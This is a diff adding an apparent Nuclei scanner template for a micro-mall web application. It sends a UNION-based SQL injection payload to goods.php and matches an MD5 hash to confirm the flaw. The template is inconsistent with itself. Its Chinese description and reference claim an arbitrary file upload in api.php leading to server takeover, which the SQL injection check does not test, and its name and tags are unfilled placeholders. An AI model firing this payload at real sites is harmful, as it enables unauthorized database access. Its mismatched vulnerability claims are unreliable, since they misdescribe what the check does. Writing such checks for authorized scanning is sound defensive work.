@@ -1,0 +1,18 @@
+id: wssc-goods-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 微商城系统 api.php 接口处存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://github.com/wy876/POC/blob/299ba35f3060728286cf1b0b201bab5aa6c1beb9/%E5%BE%AE%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F/%E5%BE%AE%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9Fapi.php%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/goods.php?id='+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(IFNULL(CAST(MD5(1)+AS+NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b92382'
